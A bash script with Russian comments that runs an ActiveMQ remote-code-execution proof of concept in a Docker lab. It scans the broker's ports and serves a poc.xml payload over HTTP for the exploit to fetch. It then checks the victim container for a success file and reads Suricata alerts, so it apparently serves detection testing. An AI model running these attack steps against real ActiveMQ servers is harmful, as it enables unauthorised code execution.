#!/bin/bash
set -e

echo "=== Шаг 1: Сканирование портов ActiveMQ ==="
docker exec attacker nmap -sV -p 61616,8161 172.20.0.101

echo ""
echo "=== Шаг 2: Копирование файлов в контейнер attacker ==="
docker cp poc.py attacker:/root/poc.py
docker cp poc.xml attacker:/root/poc.xml
echo "Файлы скопированы"

echo ""
echo "=== Шаг 3: Запуск HTTP-сервера в фоне ==="
docker exec -d attacker bash -c "cd /root && python3 -m http.server 8888"
sleep 2
echo "HTTP-сервер запущен на порту 8888"

echo ""
echo "=== Шаг 4: Выполнение атаки ==="
docker exec attacker python3 /root/poc.py 172.20.0.101 61616 http://172.20.0.10:8888/poc.xml
echo "Атака выполнена"
sleep 3
echo "Ожидание обработки событий Suricata..."

echo ""
echo "=== Шаг 5: Проверка содержимого /tmp в victim-activemq ==="
docker exec victim-activemq ls -la /tmp
echo ""
echo "Содержимое файла /tmp/activeMQ-RCE-success (если существует):"
docker exec victim-activemq cat /tmp/activeMQ-RCE-success 2>/dev/null || echo "Файл не найден"

echo ""
echo "=== Шаг 6: Последние записи из Suricata ==="
# Получаем логи с локального хоста (где запущен Suricata)
if [ -f /var/log/suricata/eve.json ]; then
  echo "Последние 5 записей из /var/log/suricata/eve.json:"
  # Пытаемся использовать jq для красивого вывода, если доступен
  if command -v jq &> /dev/null; then
    tail -n 20 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert" or .event_type=="http" or .event_type=="flow") | "\(.timestamp // .ts // "N/A") [\(.event_type)] \(.alert.signature // .alert.msg // "N/A")"' 2>/dev/null | tail -n 5 || tail -n 5 /var/log/suricata/eve.json
  else
    # Если jq недоступен, просто выводим последние 5 строк
    tail -n 5 /var/log/suricata/eve.json
  fi
elif sudo test -f /var/log/suricata/eve.json 2>/dev/null; then
  echo "Последние 5 записей из /var/log/suricata/eve.json (через sudo):"
  if command -v jq &> /dev/null; then
    sudo tail -n 20 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert" or .event_type=="http" or .event_type=="flow") | "\(.timestamp // .ts // "N/A") [\(.event_type)] \(.alert.signature // .alert.msg // "N/A")"' 2>/dev/null | tail -n 5 || sudo tail -n 5 /var/log/suricata/eve.json
  else
    sudo tail -n 5 /var/log/suricata/eve.json
  fi
else
  echo "Файл /var/log/suricata/eve.json не найден. Проверьте статус Suricata:"
  sudo systemctl status suricata --no-pager -l || echo "Suricata не запущена или недоступна"
fi

echo ""
echo "=== Тест завершен ==="
